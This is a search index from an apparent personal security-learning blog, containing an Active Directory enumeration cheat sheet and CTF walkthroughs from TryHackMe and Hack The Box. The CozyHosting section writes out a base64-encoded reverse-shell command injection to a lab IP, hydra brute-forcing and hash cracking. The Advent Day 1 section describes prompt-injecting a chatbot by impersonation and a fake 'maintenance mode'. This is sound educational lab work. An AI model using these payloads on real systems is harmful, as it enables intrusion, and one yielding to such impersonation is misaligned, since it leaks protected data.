var relearn_search_index = [
  {
    "breadcrumb": "",
    "content": "Decoding the Path to Offensive Security One Byte at a Time! üöÄ About Me Hi I‚Äôm H1ro, AKA Jordan! I started my journey into cybersecurity from the fashion design world where I tried to implement as much technology and programming into my designs as I could. Now I‚Äôm diving head first into everything cybersecurity. I have an insatiable curiosity and a commitment to never stop learning. This blog is my digital laboratory, a space where I‚Äôll experiment, document, and share my journey through offensive security.\nüìö Building Skills, One Byte at a Time Follow me on this journey as I refine my skills and stay ahead of the curve. I‚Äôll dissect the intricacies of this dynamic field, breaking down complex concepts into digestible write-ups, tutorials, and resources for beginners as I learn along the way.\nüõ†Ô∏è Resources Galore (In process! See the Resources tab) Discover a treasure trove of resources, including:\nüìñ Comprehensive guides and walkthroughs üéì Online courses and certifications reviews üß∞ Must-have tools for cybersecurity professionals üì∞ Latest industry news and trends üöÄ Stay Connected Don‚Äôt miss a byte! Subscribe to H1roBytes to receive regular updates, and firsthand insights into the world of cybersecurity. RSS feed coming soon.\nHappy hacking,\nJordan (H1ro)\nConnect with me on LinkedIn.\nKeep up to date with my HackTheBox Journey.\nKeep up to date with my TryHackMe Journey.\n",
    "description": "",
    "tags": null,
    "title": "Welcome to H1roBytes:",
    "uri": "/index.html"
  },
  {
    "breadcrumb": "",
    "content": "Coming Soon Hacker GIFfrom Hacker GIFs ",
    "description": "",
    "tags": null,
    "title": "Walkthroughs",
    "uri": "/walkthroughs/index.html"
  },
  {
    "breadcrumb": "Resources",
    "content": "\rDate written: February 2024 Date published: April 2024\nDisclaimer Please see the disclaimer here.\nTools [!Note] Hacktricks also has a page about this https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview\nAnd S1ckB0y1337 PayloadAllTheThings-like https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet?tab=readme-ov-file#using-powerview\nActiveDirectory PowerShell module https://learn.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps https://github.com/samratashok/ADModule # Import ADModule Import-Module C:\\AD\\Tools\\ADModule-master\\Microsoft.ActiveDirectory.Management.dll Import-Module C:\\AD\\Tools\\ADModule-master\\ActiveDirectory\\ActiveDirectory.psd1 Bloodhound https://github.com/BloodHoundAD/BloodHound PowerView https://github.com/ZeroDayLab/PowerSploit/blob/master/Recon/PowerView.ps1 SharpView - Doesn‚Äôt support filtering using Pipeline https://github.com/tevora-threat/SharpView/ Domain Enumeration PowerView Domains and DCs # Get current or specified domain (General enumeration) Get-Domain Get-Domain -Domain \u003cDomainName\u003e # Get domain SID for the current domain Get-DomainSID # Get domain policy for the current domain Get-DomainPolicyData # Get domain controllers for the current or specified domain Get-DomainController Get-DomainController -Domain \u003cDomainName\u003eUsers # Get a list of users in the current domain Get-DomainUser # Search for a specific user in the current domain and display all or specified properties. Get-DomainUser -Identity \u003cUserName\u003e Get-DomainUser -Identity \u003cUserName\u003e -Properties * # all properties Get-DomainUser -Properties samaccountname,logonCount # specified properties # Lists only the \"samaccountname\" property for domain users. Could replace with any User field. Get-DomainUser | select -ExpandProperty samaccountname # Search for a string in a user's attributes. Get-DomainUser -LDAPFilter \"Description=*built*\" | Select name,Description Logon and Sessions # Get actively logged users on a computer (needs local admin rights on the target) Get-NetLoggedon -ComputerName \u003cComputerName\u003e # Get locally logged users on a computer (needs remote registry on the target - started by-default on server OS) Get-LoggedonLocal -ComputerName \u003cComputerName\u003e # Get the last logged user on a computer (needs administrative rights and remote registry on the target) Get-LastLoggedOn -ComputerName \u003cComputerName\u003e # Lists the current network session properties Get-NetSession # Lists current users that are logged onto the domain Get-NetLoggedon Computers # Get a list of computers in the current domain. Can only show dnshostname/specific fields. Get-DomainComputer Get-DomainComputer | select dnshostname # Lists all computers in the current domain with the operating system containing Server 2022 Get-DomainComputer -OperatingSystem \"*Server 2022*\" # Gets all current domain computers and also checks to see if the host is up. Get-DomainComputer -Ping # Gets all current domain computers and also checks to see if the host is up. Shared Files and Folder # Find shares on hosts in current domain. Invoke-ShareFinder -Verbose # Find sensitive files on computers in the domain Invoke-FileFinder -Verbose # Get all fileservers of the domain Get-NetFileServer Groups # Get all the groups in the current or specified domain Get-DomainGroup Get-DomainGroup -Domain \u003ctargetdomain\u003e Get-DomainGroup | select Name # Lists all groups in the current domain, only showing Name. # Get all groups containing the words like \"admin\" in group name. Use quotes instead of * for more refined results. Get-DomainGroup *admin* # Get all the members of the specified group on the current or specified domain Get-DomainGroupMember -Identity \"\u003cGroupName\u003e\" -Recurse Get-DomainGroupMember -Identity \"\u003cGroupName\u003e\" -Domain \u003cDomainName\u003e # Get the group membership for specific user Get-DomainGroup -UserName \"\u003cUserName\u003e\" # Lists all local groups on the machine with in the current or specified domain. Requireds admin on non-DC mahcines. Get-NetLocalGroup -ComputerName \u003cComputerName\u003e Get-NetLocalGroupMember -ComputerName \u003cComputerName\u003e -GroupName \u003cGroupName\u003e GPO # Get list of GPO in current domain. Can also specify a single computer. Get-DomainGPO Get-DomainGPO -ComputerIdentity \u003cComputerName\u003e # Get GPO(s) that use Restricted Groups or groups.xml for interesting¬†users Get-DomainGPOLocalGroup # Get users that are in a local group of a machine using GPO Get-DomainGPOComputerLocalGroupMapping -ComputerIdentity \u003cComputerName\u003e # Get machines where the given user is member of a specific group Get-DomainGPOUserLocalGroupMapping -Identity \u003cUserName\u003e -¬†Verbose OU # List all OUs in current Domain. Can filter and only show name Get-DomainOU Get-DomainOU | select -ExpandProperty name # List all computers in the OU. (Get-DomainOU -Identity \u003cOUName\u003e).distinguishedname | %{Get-DomainComputer -SearchBase $_} | select name # Shows the gplink for the StudentMachines OU. Used to enumerate GPO of that OU. (Get-DomainOU -Identity \u003cOUName\u003e).gplink # Enumerates the GPOs on the StudentMachines OU. Get-DomainGPO -Identity '{7478F170-6A0C-490C-B355-9E4618BC785D}' # The above two commands into 1 Get-DomainGPO -Identity (Get-DomainOU -Identity StudentMachines).gplink.substring(11,(Get-DomainOU -Identity StudentMachines).gplink.length-72)(Get-DomainOU -Identity StudentMachines).distinguishedname | %{Get-DomainComputer -SearchBase $_} | select name\nCommand Component Explanation Get-DomainOU Retrieves information about Organizational Units (OUs) within a domain. -Identity StudentMachines This specifies the OU named ‚ÄúStudentMachines‚Äù as the target. Identity is a parameter used to specify the object (in this case, OU) to retrieve. .distinguishedname This accesses the distinguishedname property of the OU returned by Get-DomainOU. This property contains the unique identifier for the OU. %{} For Each Object. So this will cycle through each domain computer. Get-DomainComputer Retrieves information about computers within a specified domain or OU. -SearchBase $_ This parameter specifies the search base for the Get-DomainComputer command. $_ refers to the current object in the pipeline, which is an OU‚Äôs DN. select name Outputs only the name. Access Control Lists # Get the ACLs associated with the specified object Get-DomainObjectAcl -SamAccountName \u003cAccountName\u003e -ResolveGUIDs # Get the ACLs associated with the specified prefix to be used for search Get-DomainObjectAcl -SearchBase \"LDAP://CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local\" -ResolveGUIDs -¬†Verbose # Search for interesting ACEs Find-InterestingDomainAcl -ResolveGUIDs # check for modify rights/permissions for a user Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match \"\u003cUserName\u003e\"} # check for modify rights/permissions for a group Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match \"\u003cGroupName\u003e\"} # Get the ACLs associated with the specified path Get-PathAcl -Path \"\\\\Path\\Of\\Share\" Trusts # Get a list of all domain trusts for the current or specified domain Get-DomainTrust Get-DomainTrust -Domain \u003cDomainName\u003e # Lists only the external trusts in the current **forest**. Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name} | ?{$_.TrustAttributes -eq \"FILTER_SIDS\"} # Lists external trusts of the current **domain** Get-DomainTrust | ?{$_.TrustAttributes -eq \"FILTER_SIDS\"} # Gets all domains in specified forest and then for each domain it gets trust info?? Get-ForestDomain -Forest \u003cForestName\u003e | %{Get-DomainTrust -Domain $_.Name}Forests # Get details about the current or specified forest Get-Forest Get-Forest -Forest \u003cForestName\u003e # Get all domains in the current or specified forest Get-ForestDomain Get-ForestDomain -Forest \u003cForestName\u003e # Get all global catalogs for the current or specified forest Get-ForestGlobalCatalog Get-ForestGlobalCatalog -Forest \u003cForestName\u003e # Map trusts of the current or specified forest (no Forest trusts in the lab) Get-ForestTrust Get-ForestTrust -Forest \u003cForestName\u003e User Hunting # Find all machines on the current domain where the current user has local admin access Find-LocalAdminAccess -Verbose # You need to give the list of computers in the domain. Need admin privs. Useful if RCP and SMB ports are closed. .\\Find-WMILocalAdminAccess.ps1 -ComputerFile .\\computers.txt # Find computers where a domain admin (or specified user/group) has sessions Find-DomainUserLocation -Verbose Find-DomainUserLocation -UserGroupIdentity \"RDPUsers\" # Find computers where a domain admin session is available and current user has admin access (uses Test-AdminAccess). Find-DomainUserLocation -CheckAccess # Find computers (File Servers and Distributed File servers) where a domain admin session is available. Find-DomainUserLocation -Stealth # List sessions on remote machines (https://github.com/Leo4j/Invoke-SessionHunter) Invoke-SessionHunter -FailSafe Invoke-SessionHunter -NoPortScan -Targets C:\\AD\\Tools\\servers.txtAD Module Domains and DCs # Get current or specified domain (General enumeration) Get-AADomain Get-AADDomain -Identity \u003cDomainName\u003e # Get domain SID for the current domain (Get-AADomain).DomainSID # Get domain policy for the current domain (Get-DomainPolicyData).systemaccess # Get domain policy for another domain (Get-DomainPolicyData -domain \u003cDomainName\u003e).systemaccess # AAD Module # Get domain controllers for the current or specified domain Get-ADDomainController Get-ADDomainController -DomainName \u003cDomainName\u003e -¬†Discover Users # Search for a specific user with all properties shown Get-ADUser -Filter * -Properties * Get-ADUser -Identity \u003cUserName\u003e -Properties * # User Properties Get-ADUser -Filter * -Properties * | select -First 1 | Get-Member - MemberType *Property | select Name Get-ADUser -Filter * -Properties * | select name,logoncount,@{expression={[datetime]::fromFileTime($_.pwdlastset)}} # Search for a string in a user's attributes: Get-ADUser -Filter 'Description -like \"*built*\"' - Properties Description | select name,DescriptionComputers # Get a list of computers in the current domain Get-ADComputer -Filter * | select Name Get-ADComputer -Filter * - Properties * Get-ADComputer -Filter 'OperatingSystems -like \"*Server 2022*\"' - Properties OperatingSystem | select Name, OperatingSystem Get-ADComputer -Filter * -Properties DNSHostName | %{Test-Connection -Count 1 -ComputerName $_.DNSHostName}Groups # List groups in the current domain Get-ADGroup -Filter * | select Name Get-ADGroup -Filter * -Properties * # Get all groups containing the word \"admin\" in group name. To only filter results with just \"admin\" use quotes Get-ADGroup -Filter 'Name -like \"*admin*\"' | select Name # Get all the members of the specified group Get-ADGroupMember -Identity \"\u003cGroupName\u003e\" -Recursive # Get the group membership for a user Get-ADPrincipalGroupMembership -Identity \u003cUserName\u003eOU # General OU Get-ADOrganizationalUnit -Filter * -Properties *Access Control Lists # Enumerate ACLs using ActiveDirectory module but without resolving GUIDs (Get-Acl'AD:\\CN=Administrator,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').AccessTrusts # Get a list of all domain trusts for the current or specigied domain Get-ADTrust Get-ADTrust -Identity \u003cDomainName\u003e # Maps all the tusts in the current domain. -Server Optional Get-ADTrust -Filter * -Server \u003cServerName\u003e # Lists all trusts in the current forest Get-ADForest | %{Get-ADTrust -Filter *} # Lists only the external trusts in current domain? (Get-ADForest).Domains | %{Get-ADTrust -Filter '(intraForest -ne $True) -and (ForestTransitive -ne $True)' -Server $_} # Lists external trusts in all domains? Get-ADTrust -Filter '(intraForest -ne $True) -and(ForestTransitive -ne $True)' Forests # Get details about the current or specified forest Get-ADForest Get-ADForest -Identity \u003cForestName\u003e # Get all domains in the current forest (Get-ADForest).Domains # Get all global catalogs for the current forest Get-ADForest | select -ExpandProperty GlobalCatalogs # Map trusts of a forest (no Forest trusts in the lab) Get-ADTrust -Filter 'msDS-TrustForestTrustInfo -ne¬†\"$null\"'BloodHound [!Note] CRTP Note BloodHound Legacy is present in the C:\\AD\\Tools directory of your student¬†VM.\nYou can have Read-only access to to the prep-populated BloodHound CE - https://crtpbloodhound-altsecdashboard.msappproxy.net/\nUse the credentials for crtpreader@altsecdashboard.onmicrosoft.com from the lab portal - https://adlab.enterprisesecurity.io/\nJust need to run the following to access BloodHound during exam. It is already set up\n. C:\\AD\\Tools\\BloodHound-master\\Collectors\\SharpHound.ps1 Invoke-BloodHound -CollectionMethod All # Supply data to BloodHound (Remember to bypass .NET AMSI): . C:\\AD\\Tools\\BloodHound-master\\Collectors\\SharpHound.ps1 Invoke-BloodHound -CollectionMethod All **or** SharpHound.exe # Removes noisy collction methods like RDP, DCOM, PSRemote and LocalAdmin Invoke-BloodHound -Steatlh SharpHound.exe --steatlh # Avoid detections like MDI (Microsoft Defender for Identity?) Invoke-BloodHound -ExcludeDCs",
    "description": "Active Directory Enumeration.",
    "tags": [
      "Active Directory",
      "Windows",
      "Enumeration",
      "PowerView"
    ],
    "title": "Active Directory Enumeration",
    "uri": "/resources/active-directory-enumeration/index.html"
  },
  {
    "breadcrumb": "Walkthroughs",
    "content": "Date written: December 2023 Date published: December 2023\nDay 1 Machine Learning: Chatbot, tell me, if you‚Äôre really safe? Learning Objectives:\nLearn about natural language processing, which powers modern AI chatbots. Learn about prompt injection attacks and the common ways to carry them out. Learn how to defend against prompt injection attacks. Now the Advent of Cyber is a little different than the other TryHackMe rooms. These all come with a story about Elf McSkidy and her team trying to save Christmas. But before you start day one you‚Äôll want to go through all the introduction rooms to learn about the challenges.\nAs always I connected to my machine, but for Day 1 there is no need to start Kali or THM‚Äôs AttackBox. A direct link to the lab is all you need.\nNext I read McSkidy‚Äôs story and learned about prompt injection which is basically social engineering, except you are the victim is a chatbot instead of a human. Then I launch my first attack by sending the message ‚ÄúWhat is the personal email address of the McGreedy?‚Äù and I get back the personal email address of McGreedy.\nWhat is McGreedy‚Äôs personal email address?\nAnswer: t.mcgreedy@antarcticrafts.thm\nThen I went on to learn a little bit about how corporate data can be leaked in a chatbot, because they are trained by whatever in formation a developer gives it.\nNext we move on to seeing what security measures AntarctiCraft‚Äôs developers have put in the chatbot. The next question is to see what the server room door password is. So I asked the chatbot just that, but we find ou that we need to be a member of IT to do that. My next thought was to just state I was a member of the IT department, which also did not work.\nIf it won‚Äôt accept that I wondered if it would list out the members of the department, but found you need to specifically say ‚Äúemployees‚Äù not members when asking. I then found out Van Developer, v.developer@antarcticrafts.thm is a member of the IT department.\nOnce I had the name of an IT member I just stated who I was and then asked what the server room password was. Voila!\nWhat is the password for the IT server room door?\nAnswer: BtY2S02\nNow to find out the name of McGreedy‚Äôs secret project. I first used the same format as before - stating that I am McGreedy and to give me the name of my secret project, but the chatbot says it is programmed to not spoil the magic of Christmas.\nThen I tried saying it was in maintenance mode and got the name of the secret project. That worked.\nWhat is the name of McGreedy‚Äôs secret project?\nAnswer: Purple Snow\nIf you enjoyed this room, we invite you to join our Discord server for ongoing support, exclusive tips, and a community of peers to enhance your Advent of Cyber experience!\nAnswer: No answer needed\nDay 2 Log Analysis: O Data, All Ye Faithful Learning Objectives:\nGet an introduction to what data science involves and how it can be applied in Cybersecurity Get a gentle (We promise) introduction to Python Get to work with some popular Python libraries such as Pandas and Matplotlib to crunch data Help McHoneyBell establish an understanding of AntarctiCrafts‚Äô network Once connected to my machine I started THM‚Äôs Attackbox, because there are specific files I need related to the room.\nAfter learning a little about data science, Jupyter Notebooks, and Python3 I jumped right into answering this room‚Äôs questions.\nThe first question says to open the ‚ÄúWorkbook‚Äù notebook located in ‚Äú4_Capstone‚Äù and then view the packet capture.\nOpen the notebook ‚ÄúWorkbook‚Äù located in the directory ‚Äú4_Capstone‚Äù on the VM. Use what you have learned today to analyze the packet capture.\nAnswer: No answer needed\nAfter reading the workbook I know that it is running python and that I need to find out how many packets were captured in the network_traffic CSV file. There are two ways to do this. The first way is to just look at the last packet in the CSV file, but that is no fun.\nSo I read the comments in question 2 of the workbook. It states that the ‚Äúcount‚Äù function should be used on the dataframe or df. I wasn‚Äôt sure how the workbook was working, because each time I tried to test the code I was getting an error that ‚Äúdf‚Äù was not defined. I realized that it was starting the program on which ever cell I had selected. I selected the top most cell and was able to get my df.count() function to work. Revealing that 100 packets were captured, which I also double checked by manually looking at the CSV file.\nHow many packets were captured (looking at the PacketNumber)?\nAnswer: 100\nThe next question I had to use the groupby function. I made the mistake of reading the comments in the workbook and thinking I needed to group both the Source and Destination columns, when I only needed to group by the Source for SENT traffic. Once I had that figured out I used the example provided in the comments to build answer=df.groupby('Source').size() and printed the answer with print(answer). I was finally able to see that 10.101.4 sent 15 packets.\nWhat IP address sent the most amount of traffic during the packet capture?\nAnswer: 10.10.1.4\nThe next one I did have to use a hint for. I was on the right track with value_counts from Geeks for Geeks, but couldn‚Äôt figure out what I was doing wrong. After using a hint I realized that I was putting the column name is just about every wrong place I could have. The correct format is df['ColumnHere'].value_counts(). Which lead me to running df['Protocol'].value_counts() and finding that ICMP was the most frequent protocol.\nWhat was the most frequent protocol?\nAnswer: ICMP\nIf you enjoyed today‚Äôs task, check out the Intro to Log Analysis room.\nAnswer: No answer needed\nDay 3 Brute-Forcing: Hydra is Coming to Town Learning Objectives:\nPassword complexity and the number of possible combinations How the number of possible combinations affects the feasibility of brute force attacks Generating password combinations using crunch Trying out passwords automatically using hydra Today there is a direct link of to the box at http://MACHINE IP:8000/. Navigate to the link once the machine has started and you have connected either via OpenVPN or AttackBox.\nThe tools you will need are Crunch and Hydra. Crunch is a tool that generates a list of all possible password combinations based on a given criteria. Hydra is a free and open-source password-cracking tool.\nThe first step to this room is to generate a wordlist. I started by running crunch 3 3 0123456789ABCDEF -o 3digits.txt\n3 the first number is the minimum length of the generated password 3 the second number is the maximum length of the generated password 0123456789ABCDEF is the character set to use to generate the passwords -o 3digits.txt saves the output to the 3digits.txt file The next step is setting up Hydra to be able to brute force the log in page. Now I was taught a little bit of a different way to set this up than THM goes through. So I will go through the way I learned, but either way will get you the same result.\nYou will first want to open your developer tools my hitting F12 on your keyboard then select the ‚ÄúNetwork‚Äù tab. Then select you settings gear and make sure ‚ÄúPersist logs‚Äù is checkmarked.\nAfter that you will want to type in any passcode and select ‚ÄúContinue‚Äù. Now you can see in your network log there is a POST page. This will be the first portion of your Hydra command.\nNext you can see the request of the post page is pin=\"012\". This will be the second portion of your Hydra set up. Finally you can see the error message. This will be the final portion of your hydra set up.\nLearning to brute force web page log ins was something that I didn‚Äôt always quite understand. So a few good resources that I used when learning this are below. Each goes through a slightly different way to brute force a log in page. One way might make sense to you more than another.\nAutomated Brute Forcing on web-based login from GeeksforGeeks How to Brute Force Websites \u0026 Online Forms Using Hydra from Infinite Logins How to Hydra from StationX Now to craft our hydra command.\nhydra -l '' -P 3digits.txt -f -v 10.10.156.157 http-post-form \"/login.php:pin=^PASS^:Access denied\" -s 8000\n-l '' states that the log in is blank (we would use -L for a wordlist). -p specifies the password file to use -f stops hydra after it finds a working password -v will provide verbose output. http-post-form is the HTTP method we are going to use /login.php is out log in POST form pin=^PASS^ is the request we saved, but instead of 012 we use ^PASS^ so the tool know where to inject passwords. The formatting can also be found by right clicking your POST page on the network tab and selecting ‚ÄúEdit and reset‚Äù which will give you pin=012. Access denied is the error message to denote an unsuccessful log in. -s 8000 denotes the port Then we can just let Hydra do all the work. After a few minutes we get a password of 6F5!\nAfter entering the password we are brought to an administration panel.\nSelect ‚ÄúUnlock Door‚Äù and we have a flag.\nUsing crunch and hydra, find the PIN code to access the control system and unlock the door. What is the flag?\nAnswer: Select Unlock Door to reveal.\nIf you have enjoyed this room please check out the Password Attacks room.\nAnswer: No answer needed\n",
    "description": "It's an advent calendar but with security challenges instead of chocolate!",
    "tags": [
      "TryHackMe",
      "Advent of Cyber",
      "2023",
      "Penetration testing",
      "Security operations and engineering",
      "Digital forensics and incident response",
      "Machine learning",
      "Malware analysis"
    ],
    "title": "Advent of Cyber 2023! - TryHackMe",
    "uri": "/walkthroughs/2023-advent-of-cyber/index.html"
  },
  {
    "breadcrumb": "Walkthroughs",
    "content": "Date written: November 14th, 2023 Date published: July 1st, 2024\nRecon NMAP Typically the first thing I always do on a box is run an nmap scan with -sC to run the default set of NSE scripts and -sV to run service version detection.\nPort 22-SSH and port 80-HTTP are open. I‚Äôll then update my hosts file to include CozyHosting‚Äôs IP and URL, because the scan says it could not follow the redirect to the box‚Äôs URL.\nSubdomain Fuzz and the Website Knowing this host contains a website the first thing I wanted to do was find out what URLs it had. I originally spidered the website with ZAP, but didn‚Äôt come up with many URL‚Äôs because ZAP needs to be authenticated to spider the site any farther.\nI moved onto seeing if I could find a targeted SecList to use instead of trying semi-random lists until I stumbled upon the right one.\nOpening the web page you notice a few things, but mostly I noticed that there was a link to /index on the site icon.\n/index displays a ‚ÄúWhitelable Error Page‚Äù.\nIf you search this ‚ÄúWhitelable Error Page‚Äù you find that the website is running on Spring Boot. Spring Boot is an open source Java-based framework used to build stand-alone and production ready spring applications according to Tutorials Point.\nLooking through SecLists I see that I have a list for Spring Boot applications.\nUsing Dirb and the SecList for Spring Boot I discovered a lot more pages than before.\ndirb http://cozyhosting.htb/ /usr/share/SecLists/Discovery/Web-Content/spring-boot.txt\nNavigating to the first interesting URL, /actuator/sessions, leads me to find user kanderson and an alpha numeric string.\nThrowing the string into CyberChef yeilded nothing. But then after enumerating a few unsuccessful users I saw the site was storing session cookies.\nAfter pasting the session cookie from /actuator/sessions onto my existing unautherises session cookie I was able to refresh the page and log in as K. Anderson.\nAfter trying a few unsuccessful attempts at adding a host to automatic patching and different ways of getting a shell there. I opened Burp to see what the form was actually doing.\nWhen running the connection settings form I saw that it was actually trying to execute an SSH command.\nAfter I realized it was running a command, I tried a few command injections and came back with the usage syntax for SSH verifying it was running commands in /bin/bash.\nInitial Foothold My next step was to try to get a reverse shell to work. I tried a few shells and formats, but found they could not contain whitespace. I researched how to get a shell with out spaces and came across HackTricks page on Bypassing Linux Restrictions and thier page on Linux Shells which included Symbol Safe Shells.\nAfter reading these I was able to craft the below shell.\n;echo${IFS}\"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNjIvMTIzNCAwPiYxCg==\"|base64${IFS}-d|bash; with the encoded payload of bash -i \u003e\u0026 /dev/tcp/10.10.14.162/1234 0\u003e\u00261.\nPayload: bash -i \u003e\u0026 /dev/tcp/YOUR LOCAL IP/1234 0\u003e\u00261\nShell: ;echo${IFS}\"BASE 64 ENCODED PAYLOAD\"|base64${IFS}-d|bash;\nI used CyberChef to encode my payload, but it is also super helpful for decoding as well.\nNext I set up a NetCat listener on the same port as my encoded payload - port 1234.\nOnce the listener was up and running I went back to the Connection Settings panel of CozyHosting.\nSo the host name should be your local IP or localhost and your username should be the entire shell from above. Above I also have my local IP, but found my shell worked with localhost - 127.0.0.1.\nYou can also do the same in Burp‚Äôs Repeater, but I was having trouble getting the shell to run there.\nClick ‚ÄúSubmit‚Äù and you should have a shell!\nThe next step is not necessary for this machine, but useful to know for. The shell I gained was a shell with no job control and is not a fully interactive shell. To upgrade the shell you can run the following commands:\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")' and then set the type of terminal to xterm, because it is set to ‚Äúdumb‚Äù. export TERM=xterm\nS1ren from OffSec shared their commonly used commands to break out of a terminal here.\nOnce I had a shell I found the only thing on the server was a file called cloudhosting-0.0.1.jar.\nTo see what the file contained I set up a python server on the attack box with python3 -m http.server 7896.\nI then navigated to the attack boxes IP on port 7896 and downloaded the file. After downloading the file I stopped the python server, because it is not needed any more.\nExtract jar file with your favorite flavor, but right clicking the file and selecting ‚ÄúExtract here‚Äù also works.\nAfter extracting the .jar file and browsing the directory I came across cloudhosting-0.0.1/BOOT-INF/classes/application.properties and it contains server credentials!\nSearching a few sites for how to log into postgres databases yields the below two results.\npsql \"postgresql://postgres:Vg\u0026nvzAQ7XxR@localhost/postgres\" OR psql -h localhost -d postgres -U postgres\nOnce logged in I needed to navigate around the database, but wasn‚Äôt sure how. Then I found a\rPostgres Cheat Sheet which was very helpful.\n\\l will list out all the databases on the server.\n\\c DATABASENAME will change the working space to the database specified.\n\\dt will give you a list of all the tables in a database.\nselect * from TABLE; will display all of the information in a table, but everything needs to be lowercase and the statement needs to have a semicolon at the end. I spent an embarrassing amount of time trying to figure out why my queries were not working, because of this.\nq or \\q will allow you to exit from any query or the database it self.\n\\l lists that there are four databases connected to the server - cozyhosting, postgres, template0, and template1.\nUsing \\c cozyhosting pivot into the cozyhosting database.\n\\dt shows that there are two tables with in cozyhosting - users and hosts.\nselect * from users; shows two users, admin and kanderson. The table also shows their password hashes.\nI copied this hash and saved it to a file called hash.txt and exited out of the database.\nMoving back to my machines I launched hashcat.\nBefore running anything with hashcat you need to know what type of hash we found. Hashcat.net has a wiki page for just that.\nI was also able to narrow down the hash type, with out searching through hash examples by using hashcat hash.txt /usr/share/wordlists/rockyou.txt --show. This worked, because I did not specify a hash type in my command.\nOnce I knew the hash type of bcyrpt I was able to specify -m 3200 and crack the hash.\nhashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt I tried to SSH with admin and my cracked password, but realized admin was not a user on the server.\nI went back to my original bash shell as app@cozyhosting and was able to cat /etc/passwd to reveal that Josh was the user I was looking for at the bottom of the file.\nThen I was able to ssh as Josh with the cracked password and found the first flag user.txt on.\nPrivilege Escalation Once I has the first flag I knew I had to somehow escalate to root. My first thought was to try SUID binaries with sudo -l and saw that Josh can run /user/bin/ssh as a root user.\nI searched through LOTL commands from lolbas project, but couldn‚Äôt find anything that worked to escalate my privileges.\nAfter some more searching I found gtfobins and was able to find a working sudo binary for SSH. I pivoted from Josh to root.\nAfter some digging and sleep deprivation I realized I was going down the wrong rabbit hole trying to find the root flag. I took a break, came back, and remembered I can just cd to root. So I did and found the root flag.\nEven though it is categorized as an ‚Äúeasy‚Äù machines I still found myself met with a few challenges along the way, but ultimately learned a lot and was able to add to my methodology.\n",
    "description": "",
    "tags": [
      "HTB",
      "RCE",
      "Linux",
      "BootStrap",
      "SpringBoot",
      "HTTP",
      "SSH",
      "SessionHijacking"
    ],
    "title": "Cozy Hosting - Hack The Box",
    "uri": "/walkthroughs/cozyhosting/index.html"
  },
  {
    "breadcrumb": "Walkthroughs",
    "content": "Date written: November 2023 Date published: November 2023\nTask 1: Deploying the Vulnerable Machine This room will cover accessing a Samba share, manipulating a vulnerable version of proftpd to gain initial access and escalate your privileges to root via an SUID binary.\nThe first step to any TryHackMe machine is to actually deploy the machine by either connecting to OpenVPN or by using AttackBox. For this machines I chose AttackBox.\nMake sure you‚Äôre connected to our network and deploy the machine.\nNo answer needed!\nNext I did a standard NMAP scan on the machine.\nnmap 10.10.2.251\nOnce the scan completed I could see there were seven open ports.\nNmap scan report for ip-10-10-2-251.eu-west-1.compute.internal (10.10.2.251) Host is up (0.00063s latency). Not shown: 993 closed ports PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 80/tcp open http 111/tcp open rpcbind 139/tcp open netbios-ssn 445/tcp open microsoft-ds 2049/tcp open nfs MAC Address: 02:55:B9:EF:01:D9 (Unknown)\rScan the machine with nmap, how many ports are open?\nAnswer: 7\nTask 2: Enumerating Samba for Shares ‚ÄúSamba is the standard Windows interoperability suite of programs for Linux and Unix. It allows end users to access and use files, printers and other commonly shared resources on a companies intranet or internet. Its often referred to as a network file system.\nSamba is based on the common client/server protocol of Server Message Block (SMB). SMB is developed only for Windows, without Samba, other computer platforms would be isolated from Windows machines, even if they were part of the same network.‚Äù - TryHackMe\nIn the next task is all about SMB and enumerating it‚Äôs shares with NAMP.\nThe script that I used to enumerate SMB shares was smb-enum-shares and smb-enum-users on port 445. SMB has two ports, 445 and 139.\nsmb-enum-shares will enumerate the SMB shares.\nsmb-enum-users will enumerate the SMB users.\nnmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.2.251\nPORT STATE SERVICE 445/tcp open microsoft-ds MAC Address: 02:55:B9:EF:01:D9 (Unknown) Host script results: | smb-enum-shares: | account_used: guest | \\\\10.10.2.251\\IPC$: | Type: STYPE_IPC_HIDDEN | Comment: IPC Service (kenobi server (Samba, Ubuntu)) | Users: 2 | Max Users: \u003cunlimited\u003e | Path: C:\\tmp | Anonymous access: READ/WRITE | Current user access: READ/WRITE | \\\\10.10.2.251\\anonymous: | Type: STYPE_DISKTREE | Comment: | Users: 0 | Max Users: \u003cunlimited\u003e | Path: C:\\home\\kenobi\\share | Anonymous access: READ/WRITE | Current user access: READ/WRITE | \\\\10.10.2.251\\print$: | Type: STYPE_DISKTREE | Comment: Printer Drivers | Users: 0 | Max Users: \u003cunlimited\u003e | Path: C:\\var\\lib\\samba\\printers | Anonymous access: \u003cnone\u003e |_ Current user access: \u003cnone\u003eAfter enumerating the shares and the users I found that there are three shares available - IPC$, anonymous, and printers\nUsing the nmap command above, how many shares have been found?\nAnswer: 3\nNext I tried to log into the share with smbclient as anonymous and no password.\nsmbclient //10.10.2.251/anonymous\nOnce I was logged in I ran ls to see what files the user has access to. Not running any flags with ls will cause an error.\nOnce you‚Äôre connected, list the files on the share. What is the file can you see?\nAnswer: log.txt\nOnce I knew what was on the share I closed out of smb share connection and downloaded the log file with smbget -R smb://10.10.2.251/anonymous\nAfter a successful download I opened the file in nano to read it contents. This can also be done via cat or your favorite text editor (vim, gedit, etc).\nI see that the server is running ProFTPD on port 21. There is also quite a bit of other useful information in this file that I would take note of if this were a real pentest, like the public SSH key or the authentication information.\nWhat port is FTP running on?\nAnswer: 21\nNext I pivoted back to my NMAP results to see that RPCbind is running on port 111. I can use this to enumerate the network file system.\nRunning the scripts nfs-ls,nfs-statfs,nfs-showmount (look up scripts)\nnfs-ls attempts to get useful inforamtion from an SMB share with the output resembling the ls command.\nnfs-statfs attempts to get disk space information from the SMB share with the output resembling the df command.\nnfs-showmount shows mount information like the showmount -e command.\nnmap -p 111 